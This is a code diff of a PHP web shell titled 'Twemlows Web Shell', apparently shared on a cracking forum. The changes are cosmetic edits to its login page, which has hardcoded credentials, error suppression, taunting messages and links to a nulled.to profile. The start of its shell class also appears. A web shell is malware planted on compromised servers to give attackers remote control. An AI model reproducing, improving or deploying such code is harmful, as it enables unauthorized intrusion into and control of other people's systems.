@@ -24,10 +24,11 @@ I have provided you a way to check your IP and perform your own DNS leak test ju
 Some unicode characters might not work depending on the editor it is that you're using. You may see "- ?" instead of the emojis so please adjust your editors so you can see the emojis.
 
 Please report any bugs to --> LoseThos@protonmail.com <--*/
+//- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+// Login Page
 error_reporting(0); 
 set_time_limit(0);
 session_start();
-// Login Page
 $login='Twemlow'; // Username
 $password='Emrys'; // Password
 $auth=1; // Authentication
@@ -37,14 +38,14 @@ if($auth==1){if(@$_POST['login']==$login && @$_POST['password']==$password)$_SES
 
 if($_SESSION['an']==0){
 echo $header;
-echo '<center><font color=#800080 size=4><b>༺♔ King ♔༻</font></b><br><b><font color=#800080 size=4>༺࿇ Twemlow ࿇༻</font></b>';
-echo '<center><table><form method="POST"><tr><td><font color=#800080 size=4>【Login】:</td><td><input type="text" name="login" value=""></td></tr><tr><td><font color=#800080 size=4>【Password】:</td><td><input type="password" name="password" value=""></td></tr><tr><td></td><td><input type="submit" value="Enter"></td></tr></form></table></center><br>';
+echo '<center><table border=0 width="555" bgcolor=#eeeeee cellspacing=0 cellpadding=3 style="border: #800080 2px solid"><tr><td align=center><b><font color=#000000><center><font color=#800080 size=4><b>༺♔ King ♔༻</font></b><br><b><font color=#800080 size=4>༺࿇ Twemlow ࿇༻<center><table><form method="POST"><tr><td><font color=#800080 size=4>【Login】:</td><td><input type="text" name="login" value=""></td></tr><tr><td><font color=#800080 size=4>【Password】:</td><td><input type="password" name="password" value=""></td></tr><tr><td></td><td><input type="submit" value="Enter"></td></tr></form></table></center><br></font></b></b></td></tr>';
 echo '<center><font color=#800080 size=4><b>So my code defeats you again huh? Shame...</font></b><br>';
 echo '<center><img src="https://www.nulled.to/uploads/profile/photo-1822548.gif?_r=1589365892" border="0"width="350px" height="250px"><br>';
 echo '<center><table border=0 width="555" bgcolor=#eeeeee cellspacing=0 cellpadding=3 style="border: #800080 2px solid"><tr><td align=center><b><font color=#000000>【Visit Me </font><a href="https://www.nulled.to/user/4397640-twemlowsemrys" target="_blank">Twemlows Shell</font><a>】</b></td></tr>';
 
 echo $footer;
 exit;}
+//- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 // Shell
 $xshell = $SERVER_['PHP_SELF'];
 class shell
@@ -200,7 +201,7 @@ return $res;
 function shellWindow()
 {
 $res = '';
-$res .= '<html><head><title>Twemlows Web Shell</title><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"></head>
+$res .= '<html><head><title>! Twemlows Web Shell !</title><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"></head>
 
   <script type="text/javascript">
     var msg = document.title;
